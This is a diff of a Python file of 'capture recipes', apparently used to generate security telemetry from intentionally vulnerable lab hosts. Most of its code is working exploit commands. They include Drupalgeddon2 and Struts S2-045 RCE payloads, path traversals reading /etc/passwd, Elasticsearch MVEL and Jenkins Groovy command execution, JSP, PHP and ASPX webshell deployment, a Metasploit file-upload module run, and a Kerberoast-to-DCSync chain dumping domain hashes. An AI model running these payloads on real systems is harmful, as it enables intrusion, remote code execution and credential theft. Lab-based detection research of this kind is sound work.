@@ -61,24 +61,15 @@ CAPTURE_RECIPES: dict[str, CaptureRecipe] = {
         host_setup_command=r"""sh -lc 'base=http://127.0.0.1:$TARGET_PORT; host=$TARGET_HOST:$TARGET_PORT; for i in $(seq 1 30); do page=$(curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-admin/install.php" 2>/dev/null || true); test -n "$page" && break; sleep 2; done; if printf "%s" "$page" | grep -q "language-chooser"; then curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" -X POST "$base/wp-admin/install.php?step=1" -d "language=" >/dev/null; fi; page=$(curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-login.php"); if ! printf "%s" "$page" | grep -q "user_login"; then curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" -X POST "$base/wp-admin/install.php?step=2" --data-urlencode "weblog_title=PortalLab" --data-urlencode "user_name=admin" --data-urlencode "admin_password=PortalLab1!" --data-urlencode "admin_password2=PortalLab1!" --data-urlencode "admin_email=portal@example.invalid" --data-urlencode "blog_public=0" --data-urlencode "Submit=Install WordPress" >/dev/null; fi; curl -sS -H "Host: $TARGET_HOST:$TARGET_PORT" "$base/wp-login.php" | grep -q "user_login" && echo PORTAL_HOST_SETUP:wordpress-installed' """,
         host_setup_pattern=r"PORTAL_HOST_SETUP:wordpress-installed",
     ),
-    # vuln_confluence_rce has no recipe: found live 2026-07-31 -- the exploit
-    # endpoint is behind Confluence's global setup filter, and the vulhub
-    # README is explicit that clearing setup requires "a Confluence Server
-    # test certificate from Atlassian" (a real license key issued by an
-    # external third party). That can't be scripted into a deterministic,
-    # offline, replayable host_setup_command the way a local SQLite/MySQL
-    # install can. See config/security_corpus.yaml's
-    # scenario_scope.excluded_from_lab_replay -- this scenario is classified
-    # as theory, not a backed lab exercise, for the same reason as the
-    # generic web_* entries there.
+    # vuln_confluence_rce has no recipe: the exploit endpoint is behind
+    # Confluence's global setup filter, and clearing setup requires a real
+    # Atlassian license key. Can't be scripted into a deterministic offline
+    # replay; see scenario_scope.excluded_from_lab_replay — classified theory.
     "vuln_drupal_rce": CaptureRecipe(
         # A fresh drupal/CVE-2018-7600 container serves only /core/install.php
-        # until the installer wizard is completed (found live 2026-07-31: the
-        # exploit request always fell through to a "Redirecting to
-        # /core/install.php" body, never `id`'s output, regardless of payload
-        # correctness). host_setup_command drives the standard-profile/sqlite
-        # install wizard end to end (profile select -> db config -> batch
-        # install poll -> site configure) before the exploit ever runs.
+        # until the installer wizard is completed, so host_setup_command drives
+        # the standard-profile/sqlite install wizard end to end (profile select
+        # -> db config -> batch install poll -> site configure) first.
         command=r"""out=$(curl -sS --max-time 30 -X POST "http://$TARGET_HOST:$TARGET_PORT/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" --data-urlencode 'form_id=user_register_form' --data-urlencode '_drupal_ajax=1' --data-urlencode 'mail[#post_render][]=exec' --data-urlencode 'mail[#type]=markup' --data-urlencode 'mail[#markup]=id'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'uid=[0-9]+\([^)]*\).*gid=[0-9]+\(' && echo __PORTAL_RECIPE_OK__""",
         host_setup_command=r"""sh -lc '
 base=http://127.0.0.1:$TARGET_PORT
@@ -127,18 +118,15 @@ printf "%s" "$front" | grep -q "core/install.php" || echo PORTAL_HOST_SETUP:drup
         command=r"""base="http://$TARGET_HOST:$TARGET_PORT/nacos"; user=portalproof; listed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?pageNo=1&pageSize=10"); created=$(curl -sS --max-time 30 -X POST -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?username=$user&password=portalproof"); confirmed=$(curl -sS --max-time 30 -H 'User-Agent: Nacos-Server' "$base/v1/auth/users?pageNo=1&pageSize=20"); login=$(curl -sS --max-time 30 -X POST "$base/v1/auth/users/login?username=nacos&password=nacos"); printf '%s\n%s\n%s\n%s\n' "$listed" "$created" "$confirmed" "$login"; printf '%s' "$created" | grep -q 'create user ok' && printf '%s' "$confirmed" | grep -q 'portalproof' && printf '%s' "$login" | grep -Eq 'accessToken|globalAdmin' && echo __PORTAL_RECIPE_OK__"""
     ),
     "vuln_gitea_rce": CaptureRecipe(
-        # The original recipe POSTed the LFS pointer registration and grepped
-        # ITS response for /etc/passwd -- found live 2026-07-31: the traversal
-        # proof only ever appears in a SEPARATE follow-up GET against the
-        # objects/<mangled-oid>/sth download route (confirmed against the
-        # vulhub README and a live capture: root:x:0:0: never appears in the
-        # POST response, only the GET). The POST also 401s without LFS basic
-        # auth against a real (non-placeholder) repo/user, and the repo/user
-        # do not exist until host_setup_command creates them, which itself
-        # needs an install-wizard pass + a `docker compose restart` (Gitea
-        # 1.4's install handler restarts its own process mid-request and never
-        # completes admin-account creation -- "admin" is also a reserved
-        # username -- so setup registers a normal user post-restart instead).
+        # The LFS path traversal proof only ever appears in a SEPARATE
+        # follow-up GET against the objects/<mangled-oid>/sth download route,
+        # never in the POST's own response. The POST also 401s without LFS
+        # basic auth against a real (non-placeholder) repo/user, which do not
+        # exist until host_setup_command creates them (install wizard + a
+        # `docker compose restart`, since Gitea 1.4's install handler
+        # restarts its own process mid-request and never completes admin
+        # creation — "admin" is also reserved, so a normal user registers
+        # post-restart instead).
         command=r"""out1=$(curl -sS --max-time 20 -u portaluser:PortalLab1! -X POST "http://$TARGET_HOST:$TARGET_PORT/portaluser/repo.git/info/lfs/objects" -H 'Accept: application/vnd.git-lfs+json' -H 'Content-Type: application/json' --data '{"Oid":"....../../../etc/passwd","Size":1000000,"User":"a","Password":"a","Repo":"a","Authorization":"a"}'); printf 'POST=%s\n' "$out1"; out2=$(curl -sS --max-time 20 --path-as-is -u portaluser:PortalLab1! "http://$TARGET_HOST:$TARGET_PORT/portaluser/repo.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth" 2>&1); printf 'GET=%s\n' "$out2"; printf '%s' "$out2" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__""",
         host_setup_command=r"""sh -lc '
 base=http://127.0.0.1:$TARGET_PORT
@@ -178,13 +166,12 @@ printf "%s" "$repo" | grep -q "\"full_name\":\"portaluser/repo\"" && echo PORTAL
         command=r"""out=$(curl -sS --max-time 30 -H 'Accept: ../../../../../../../../etc/passwd{{' "http://$TARGET_HOST:$TARGET_PORT/robots"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '^root:x:0:0:' && echo __PORTAL_RECIPE_OK__"""
     ),
     "vuln_phpmyadmin_rce": CaptureRecipe(
-        # phpMyAdmin's own container answers HTTP as soon as apache starts, well
+        # phpMyAdmin's container answers HTTP as soon as apache starts, well
         # before its linked mysql:5.5 sidecar finishes initializing (random-root
-        # password generation + first-boot schema init takes several seconds) --
-        # found live 2026-07-31: hitting the exploit right after cmd_up's plain
-        # TCP-reachability check landed on phpMyAdmin's "Access denied!" config-auth
-        # failure page every time, not the SQL console. host_setup_command polls
-        # until the config-mode auto-login actually succeeds before the exploit runs.
+        # password generation + first-boot schema init takes seconds). Hitting
+        # the exploit right after a TCP-reachability check lands on the config
+        # "Access denied!" page. host_setup_command polls until the config-mode
+        # auto-login actually succeeds before the exploit runs.
         command=r"""base="http://$TARGET_HOST:$TARGET_PORT"; curl -sS --max-time 30 -c /tmp/portal-pma.cookies "$base/" >/dev/null; out=$(curl -sS --path-as-is --max-time 30 -b /tmp/portal-pma.cookies "$base/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"); printf '%s\n' "$out" | grep -Em 5 'root:x:0:0:'; printf '%s' "$out" | grep -Eq 'root:x:0:0:' && echo __PORTAL_RECIPE_OK__""",
         host_setup_command=r"""sh -lc '
 base=http://127.0.0.1:$TARGET_PORT
@@ -255,189 +242,122 @@ exit 1' """,
         command=r"""out=$(mysql -h "$TARGET_HOST" -u root --connect-timeout=8 --skip-ssl -e "SELECT VERSION(); SHOW DATABASES;" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq '5\.5\.20' && printf '%s' "$out" | grep -Eq 'wordpress' && echo __PORTAL_RECIPE_OK__"""
     ),
     "meta3_linux_privesc": CaptureRecipe(
-        # "whoami /all" produces ~8.7KB of output -- found live 2026-08-01:
-        # lab_dispatch's execute_bash truncates around 8000 bytes, silently
-        # cutting the group-membership section this recipe needs BEFORE its own
-        # grep ever runs (recipe_success came back false every time despite the
-        # exploit genuinely succeeding -- validate_capture_signals still found
-        # real evidence in the pcap, proving this was a truncation artifact, not
-        # a failed exploit). A compact PowerShell role-membership check keeps
-        # total output under ~1.5KB, well clear of the cap.
+        # "whoami /all" produces ~8.7KB of output; lab_dispatch's execute_bash
+        # truncates around 8000 bytes, silently cutting the group-membership
+        # section this recipe needs BEFORE its own grep runs. A compact
+        # PowerShell role-membership check keeps total output under ~1.5KB.
         command=r"""out=$(nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "whoami; ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)" 2>&1); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eq 'vagrant-2008r2\\vagrant' && printf '%s' "$out" | grep -Eq 'True' && echo __PORTAL_RECIPE_OK__"""
     ),
     "meta3_tomcat_manager": CaptureRecipe(
         # Real Tomcat manager creds on this box are sploit:sploit (manager-gui
-        # role only, per C:\Program Files\...\conf\tomcat-users.xml -- read via
-        # authenticated WinRM, found live 2026-08-01). tomcat:tomcat (the old
-        # red_prompt's guess) is left commented out in that file, never active.
-        # The manager-gui role means only the CSRF-protected HTML upload works,
-        # not the text/list API (needs manager-script, which sploit lacks) --
-        # so this fetches a fresh CSRF nonce + session before deploying.
-        # Also: Tomcat here is really on 8282, not port 8080 as the old
-        # red_prompt assumed (8080 is a separate GlassFish instance).
-        #
-        # Found live 2026-08-01: undeploy needs POST, not GET (Tomcat 8 rejects
-        # a GET to /undeploy outright) -- an earlier version silently no-op'd
-        # its cleanup, leaving the webshell deployed, so the NEXT run's deploy
-        # failed with "war already exists" and skipped the real exploit request
-        # while still passing (the stale webshell answered the invoke), leaving
-        # a hollow capture despite recipe_success=true. Fixing undeploy to POST
-        # then hit a second problem: Tomcat's CSRF nonce is single-use and
-        # rotates on every state-changing request, so undeploy-then-redeploy
-        # with the same nonce 403'd, and re-extracting a fresh nonce from the
-        # undeploy response still 403'd (rotation semantics were not reliably
-        # reproducible over curl). Simplest reliable fix: never collide in the
-        # first place -- deploy under a timestamp-suffixed context path every
-        # run, so there is nothing to undeploy before deploying.
+        # role only); tomcat:tomcat is commented out, never active. manager-gui
+        # means only the CSRF-protected HTML upload works, not the text/list
+        # API (needs manager-script) -- fetch a fresh CSRF nonce + session
+        # before deploying. Tomcat is on 8282, not 8080 (8080 is GlassFish).
+        # Undeploy needs POST, not GET (Tomcat 8 rejects GET to /undeploy), and
+        # the CSRF nonce is single-use and rotates on every state-changing
+        # request, so undeploy-then-redeploy with one nonce 403s. Simplest
+        # reliable fix: never collide -- deploy under a timestamp-suffixed
+        # context path every run, so there is nothing to undeploy before
+        # deploying.
         command=r"""jar=/tmp/portal-tc.cookies; rm -f "$jar"; mkdir -p /tmp/portal-warbuild && cd /tmp/portal-warbuild && suffix=$(date +%s%N) && warname="portalproof$suffix" && printf '%s\n' '<%@ page import="java.util.*,java.io.*"%>' '<% Process p = Runtime.getRuntime().exec("cmd /c whoami"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } %>' > "$warname.jsp"; jar -cf "/tmp/$warname.war" "$warname.jsp"; page=$(curl -sS -m 10 -c "$jar" -u sploit:sploit "http://$TARGET_HOST:8282/manager/html"); nonce=$(printf '%s' "$page" | grep -o 'CSRF_NONCE=[a-zA-Z0-9]*' | head -1 | cut -d= -f2); deploy=$(curl -sS -m 15 -b "$jar" -u sploit:sploit -F "deployWar=@/tmp/$warname.war;type=application/octet-stream" "http://$TARGET_HOST:8282/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$nonce"); printf '%s\n' "$deploy" | grep -Eo '<pre>[^<]*'; sleep 2; out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/$warname/$warname.jsp"); printf '%s\n' "$out"; curl -sS -m 10 -b "$jar" -u sploit:sploit -X POST "http://$TARGET_HOST:8282/manager/html/undeploy?path=/$warname&org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null; printf '%s' "$out" | grep -Eiq 'nt authority\\system' && echo __PORTAL_RECIPE_OK__"""
     ),
     "meta3_elasticsearch_rce": CaptureRecipe(
-        # ES 1.1.1 predates Groovy scripting support (added 1.3.3), so the old
-        # red_prompt's Groovy payload always 400'd with "script_lang not
-        # supported [groovy]" -- found live 2026-08-01. This version's real
+        # ES 1.1.1 predates Groovy scripting support (added 1.3.3); its real
         # bug is CVE-2014-3120: dynamic MVEL scripting is enabled by default
         # and accepts an unrestricted script_fields script with no lang
         # specified (MVEL is the implicit default), giving direct RCE.
         command=r"""curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/" -H 'Content-Type: application/json' -d '{"name":"portal-proof"}' >/dev/null; out=$(curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/_search?pretty" -H 'Content-Type: application/json' -d '{"size":1,"query":{"match_all":{}},"script_fields":{"exp":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
     ),
     "meta3_jenkins_rce": CaptureRecipe(
-        # Real port is 8484, not 8080 as the old red_prompt assumed (8080 is
-        # GlassFish). The /script Groovy console needs no authentication at
-        # all on this box -- confirmed live 2026-08-01, direct RCE, no admin
-        # login/CSRF flow needed unlike Tomcat's manager.
+        # Real port is 8484, not 8080 (8080 is GlassFish). The /script Groovy
+        # console needs no authentication on this box -- direct RCE, no admin
+        # login/CSRF flow needed.
         command=r"""out=$(curl -sS -m 10 "http://$TARGET_HOST:8484/scriptText" --data-urlencode 'script=println "cmd /c whoami".execute().text'); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
     ),
     "meta3_webdav_upload": CaptureRecipe(
         # DAV/2 is advertised at the WAMP root (Apache 2.2.21 + PHP 5.3.10 on
         # port 8585) but PUT is only actually allowed under /uploads/ -- root
-        # and other guessed aliases (/webdav/, /dav/, /files/) all 405 --
-        # confirmed live 2026-08-01. Goes past a benign file write to a PHP
-        # webshell to prove real command execution, not just upload access.
+        # and other guessed aliases all 405. Goes past a benign file write to a
+        # PHP webshell to prove real command execution, not just upload access.
         command=r"""curl -sS -m 10 -T <(printf '<?php system($_GET["c"]); ?>') "http://$TARGET_HOST:8585/uploads/portalproof.php" >/dev/null; out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/uploads/portalproof.php?c=whoami"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
     ),
     "meta3_wordpress_ninja": CaptureRecipe(
         # WordPress + Ninja Forms 2.9.42, unauthenticated arbitrary file upload
-        # (msf exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload,
-        # "check" support confirmed vulnerable live 2026-08-01). FORM_PATH must
-        # point at a real page hosting a Ninja form -- the homepage has no
-        # visible link to one; /index.php/king-of-hearts/ (found by grepping
-        # the front page for "ninja"/"nf-form" across its linked posts) is the
-        # one that actually hosts a form. php/exec has no session, so proof is
-        # captured by redirecting the payload's own output to a web-readable
-        # file under wp-content/uploads and reading it back.
-        #
-        # Found live 2026-08-01: unlike the SMB/WinRM/Tomcat recipes, msfconsole's
-        # own status text here did NOT leak into the captured network:packet
-        # telemetry -- msfconsole generates far more setup/probing HTTP traffic
-        # than the other recipes before it ever touches the real exploit, and
-        # network:packet is a capped representative SAMPLE, not the full pcap;
-        # the real proof-file GET landed past that cap and never appeared in the
-        # capture at all despite recipe_success:true. Rather than fight sampling
-        # (a separate, already-tracked evidence-selection problem), this adds an
-        # independent postcondition_command re-check of the fixed proof URL from
-        # the lab host -- the same mechanism vulhub recipes use for postcondition
-        # proof, landing in observed_telemetry which is never subject to pcap
-        # sampling. The proof filename is fixed (not randomized) so the
-        # postcondition step can reference it without shared state; only the
-        # random webshell filename (msf's own upload, a real leftover risk on a
-        # persistent VM) is cleaned up here.
+        # (msf wp_ninja_forms_unauthenticated_file_upload). FORM_PATH must
+        # point at a real page hosting a Ninja form -- /index.php/king-of-hearts/
+        # is the one that actually hosts a form. php/exec has no session, so
+        # proof is captured by redirecting the payload's own output to a
+        # web-readable file under wp-content/uploads and reading it back.
+        # msfconsole generates far more setup/probing HTTP traffic than the
+        # other recipes, and network:packet is a capped representative SAMPLE,
+        # not the full pcap -- the real proof-file GET may fall past the cap.
+        # So an independent postcondition_command re-checks the fixed proof URL
+        # from the lab host, landing in observed_telemetry which is never
+        # subject to pcap sampling. Proof filename is fixed (not randomized) so
+        # the postcondition can reference it without shared state; only the
+        # random webshell filename is cleaned up.
         command=r"""msf_out=$(msfconsole -q -x "use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload; set RHOSTS $TARGET_HOST; set RPORT 8585; set TARGETURI /wordpress/; set FORM_PATH /index.php/king-of-hearts/; set PAYLOAD php/exec; set CMD 'whoami > portalproof-out.txt'; set AllowNoCleanup true; run; exit -y" 2>&1); printf '%s\n' "$msf_out" | tail -20; shell=$(printf '%s' "$msf_out" | grep -Eo 'nftmp-[A-Za-z0-9]+\.php' | head -1); sleep 2; out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/wordpress/wp-content/uploads/portalproof-out.txt"); printf '%s\n' "$out"; test -n "$shell" && for i in 1 2 3; do nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "Remove-Item 'C:\wamp\www\wordpress\wp-content\uploads\$shell' -Force -ErrorAction SilentlyContinue" >/dev/null 2>&1; sleep 1; done; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__""",
         postcondition_command=r"""sh -lc 'out=$(curl -sS -m 10 "http://$TARGET_HOST:8585/wordpress/wp-content/uploads/portalproof-out.txt"); printf "%s\n" "$out" | grep -Eiq "nt authority" && echo "PORTAL_TARGET_POSTCONDITION:wordpress-ninja:$out"' """,
         postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:wordpress-ninja:",
     ),
     "meta3_full_chain": CaptureRecipe(
-        # Composes techniques already independently verified live on this box
-        # rather than re-deriving them: T1595 recon (nmap service fingerprint),
-        # T1078/T1059 (WinRM vagrant:vagrant + whoami, same as
-        # meta3_winrm_weakpass), and T1190/T1059 (Elasticsearch CVE-2014-3120
-        # MVEL RCE, same as meta3_elasticsearch_rce -- the old red_prompt only
-        # fingerprinted ES with a bare GET, which doesn't reach initial-access
-        # or execution; this goes all the way to real command output like the
-        # other meta3 recipes do). mysql also needs --skip-ssl (see
-        # meta3_mysql_exploit) or the modern mysql client's default-on SSL
-        # negotiation fails against this 5.5.20 server.
+        # Composes techniques already independently verified live on this box:
+        # T1595 recon (nmap service fingerprint), T1078/T1059 (WinRM
+        # vagrant:vagrant + whoami, same as meta3_winrm_weakpass), and
+        # T1190/T1059 (Elasticsearch CVE-2014-3120 MVEL RCE, same as
+        # meta3_elasticsearch_rce -- going all the way to real command output).
+        # mysql needs --skip-ssl (see meta3_mysql_exploit) or the modern client's
+        # default-on SSL negotiation fails against this 5.5.20 server.
         #
-        # Found live 2026-08-01: like meta3_wordpress_ninja, network:packet is
-        # a capped representative sample, and in a long combined command the
-        # EARLY steps (nmap, WinRM) fell outside the sample while the LAST
-        # step (Elasticsearch) landed -- recipe_success:true but T1595/T1078
-        # kept coming back missing, consistently, not flaky. Fix: write the
-        # WinRM whoami result to a file under IIS's web root (confirmed live:
-        # the FTP root from meta3_ftp_backdoor IS the IIS web root on this
-        # box) and independently re-read it via postcondition_command, which
-        # lands in observed_telemetry and is never subject to pcap sampling --
-        # same mechanism as wordpress_ninja. T1595 reuses the same postcondition
-        # channel via a plain curl fingerprint of Elasticsearch (host 112 has
-        # curl but not nmap/nxc, so recon can't be independently re-verified the
-        # same way nmap ran it, but the ES version banner is equally valid T1595
-        # evidence and curl-only). PowerShell's default redirect encoding is
-        # UTF-16LE, which grep can't match against ASCII patterns -- Out-File
-        # -Encoding ascii avoids that.
+        # network:packet is a capped representative sample, so in a long combined
+        # command the EARLY steps fall outside it while the LAST lands. Fix:
+        # write the WinRM whoami result to a file under IIS's web root (the FTP
+        # root from meta3_ftp_backdoor IS the IIS web root) and independently
+        # re-read it via postcondition_command, which lands in observed_telemetry
+        # and is never subject to pcap sampling. T1595 reuses the same channel
+        # via a plain curl fingerprint of Elasticsearch (host has curl but not
+        # nmap/nxc). PowerShell's default redirect encoding is UTF-16LE, which
+        # grep can't match -- Out-File -Encoding ascii avoids that.
         command=r"""nmap -sV -p 21,22,80,135,445,3306,3389,4848,8080,8282,8484,8585,9200 "$TARGET_HOST" 2>&1 | tail -20; nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "whoami | Out-File -FilePath C:\inetpub\wwwroot\portalproof-fc.txt -Encoding ascii" 2>&1; mysql -h "$TARGET_HOST" -u root --connect-timeout=8 --skip-ssl -e "SELECT @@version_compile_os; SHOW DATABASES;" 2>&1; curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/" -H 'Content-Type: application/json' -d '{"name":"portal-proof"}' >/dev/null; es_out=$(curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/_search?pretty" -H 'Content-Type: application/json' -d '{"size":1,"query":{"match_all":{}},"script_fields":{"exp":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'); printf '%s\n' "$es_out"; printf '%s' "$es_out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__""",
-        # A literal `\v` sequence (backslash immediately before the letter v)
-        # gets corrupted into an actual vertical-tab control character
-        # somewhere in the exec transport -- found live 2026-08-01 debugging
-        # postcondition_success:false despite curl proving the real data was
-        # correct end to end. "vagrant-2008r2.vagrant" ('.' matches the literal
-        # backslash the target actually wrote just as well, unambiguously,
-        # since no other character can appear there) sidesteps the whole
-        # landmine instead of fighting the escaping layer that causes it.
-        # "Elasticsearch" the word never actually appears in the real / root
-        # response -- that label is nmap's own service-detection guess, not
-        # the target's real banner (found live 2026-08-01 debugging
-        # postcondition_success:false with a valid network path and a
-        # correct T1078 check: the T1595 check was checking for text that
-        # was never there). The real banner is "You Know, for Search".
-        # The final success line itself must also use printf, not echo -- this
-        # box's /bin/sh is dash, whose builtin echo interprets backslash
-        # escapes (XSI behavior) by default, so `echo "...$wa..."` silently
-        # turned the real backslash in "vagrant-2008r2\vagrant" into a literal
-        # vertical-tab byte in the captured postcondition text, which then
-        # failed to match the T1078 signature even though the check that
-        # gated reaching this line (grep via printf, unaffected) had already
-        # confirmed the real data was correct.
+        # A literal `\v` sequence gets corrupted into an actual vertical-tab
+        # control character somewhere in the exec transport; "vagrant-2008r2.vagrant"
+        # ('.' matches the literal backslash the target wrote) sidesteps the
+        # landmine. "Elasticsearch" never appears in the real / root response --
+        # that label is nmap's own service-detection guess; the real banner is
+        # "You Know, for Search". The success line must use printf, not echo:
+        # this box's /bin/sh is dash, whose builtin echo interprets backslash
+        # escapes, corrupting the backslash in "vagrant-2008r2\vagrant".
         postcondition_command=r"""sh -lc 'wa=$(curl -sS -m 10 "http://$TARGET_HOST/portalproof-fc.txt"); es=$(curl -sS -m 10 "http://$TARGET_HOST:9200/"); ok1=0; ok2=0; printf "%s" "$wa" | grep -Eiq "vagrant-2008r2.vagrant" && ok1=1; printf "%s" "$es" | grep -Eiq "You Know, for Search" && ok2=1; test "$ok1" = 1 -a "$ok2" = 1 && printf "PORTAL_TARGET_POSTCONDITION:full-chain:%s|%s\n" "$wa" "$es"' """,
         postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:full-chain:",
     ),
     "meta3_iis_http": CaptureRecipe(
-        # MS15-034 (the old red_prompt's assumed technique) doesn't work here
-        # -- a huge Range header gets a clean 416, not the crash/disclosure
-        # the CVE causes, confirmed live 2026-08-01 (this box is patched or
-        # never vulnerable to it). Real technique: the FTP root IS the IIS
-        # web root (same discovery meta3_ftp_backdoor's fix relies on) and
-        # accepts writes with the documented vagrant:vagrant creds, so an
-        # ASPX webshell uploaded over FTP and invoked over HTTP is a genuine
-        # IIS-specific initial-access + execution chain, not a borrowed
-        # WinRM/SMB technique. Cleans up via FTP DELE after invoking.
+        # MS15-034 doesn't work here -- a huge Range header gets a clean 416.
+        # Real technique: the FTP root IS the IIS web root and accepts writes
+        # with the documented vagrant:vagrant creds, so an ASPX webshell
+        # uploaded over FTP and invoked over HTTP is a genuine IIS-specific
+        # initial-access + execution chain. Cleans up via FTP DELE after
+        # invoking.
         command=r"""printf '%s\n' '<%@ Page Language="C#" %>' '<% System.Diagnostics.Process p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request.QueryString["c"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>' > /tmp/portalproof.aspx; curl -sS -m 10 -T /tmp/portalproof.aspx --user vagrant:vagrant "ftp://$TARGET_HOST/portalproof.aspx"; out=$(curl -sS -m 10 "http://$TARGET_HOST/portalproof.aspx?c=whoami"); printf '%s\n' "$out"; curl -sS -m 10 --user vagrant:vagrant "ftp://$TARGET_HOST/" -Q "DELE portalproof.aspx" >/dev/null 2>&1; printf '%s' "$out" | grep -Eiq 'apppool' && echo __PORTAL_RECIPE_OK__"""
     ),
     "meta3_struts_rce": CaptureRecipe(
-        # Neither canned msf module worked (struts2_rest_xstream: not
-        # vulnerable; struts2_multi_eval_ognl: not vulnerable, and has no
-        # Windows target anyway) -- confirmed live 2026-08-01 the real bundled
-        # jar is struts2-core-2.3.20.1.jar (read over WinRM), squarely in
-        # S2-045/CVE-2017-5638's affected range (2.3.5-2.3.31). That's a
-        # Content-Type header OGNL injection, not the REST/XStream or
-        # multi-CVE techniques the old red_prompt and canned modules assumed.
+        # Neither canned msf module worked (struts2_rest_xstream /
+        # struts2_multi_eval_ognl: not vulnerable, no Windows target anyway);
+        # the real bundled jar is struts2-core-2.3.20.1.jar, squarely in
+        # S2-045/CVE-2017-5638's affected range (2.3.5-2.3.31) -- a
+        # Content-Type header OGNL injection.
         command=r"""ct="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"; out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/struts2-rest-showcase/orders/3" -H "Content-Type: $ct"); printf '%s\n' "$out"; printf '%s' "$out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__"""
     ),
     # ── AD (DC/SRV, portal.lab domain) recipes ──────────────────────────────
-    # These previously ran only as abstracted LLM tool calls (start_lab_target,
-    # exploit_service, establish_persistence, ...) dispatched through lab.py,
-    # never as deterministic capture recipes. The real techniques underneath
-    # those tool names (and the working DCSync kill chain) already existed in
-    # lab.py / tests/benchmarks/bench_lab_exec.py -- these recipes extract and
-    # combine them into single, capture_recipes.py-shaped scripts, verified
-    # live 2026-08-01 rather than assumed from the existing (untested as
-    # recipes) code.
+    # Deterministic capture recipes extracted and combined from the working
+    # DCSync kill chain in lab.py / tests/benchmarks/bench_lab_exec.py into
+    # single, capture_recipes.py-shaped scripts.
     "kerberoast_to_da": CaptureRecipe(
-        # Found live 2026-08-01 (same class of bug as meta3_linux_privesc):
         # GetUserSPNs' three TGS hashes and secretsdump's full hash dump total
         # well over lab_dispatch's ~8000-byte output cap, silently truncating
-        # the script before its own success grep ever ran. Only short
-        # confirmation lines are printed now; the full hash text is still
-        # checked internally (grep/substring on the untruncated variable),
-        # just never echoed to stdout.
+        # the script before its own success grep. Only short confirmation lines
+        # are printed now; the full hash text is still checked internally, just
+        # never echoed to stdout.
         command=r"""out1=$(impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip "$TARGET_HOST" -request 2>&1); echo "kerberoast_hashes=$(printf '%s' "$out1" | grep -c '\$krb5tgs\$')"; python3 - <<'PYEOF'
 import subprocess, sys
 from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
@@ -465,14 +385,10 @@ print(f"dcsync_krbtgt_line={krbtgt_line}")
 sys.exit(0 if krbtgt_line else 1)
 PYEOF
 dcsync_rc=$?
-# Persistence on the DC itself (the original scenario's own intent -- "call
-# establish_persistence on the DC"), not SRV. Found live 2026-08-01: SRV's
-# scheduled-task creation never showed up in captured telemetry through
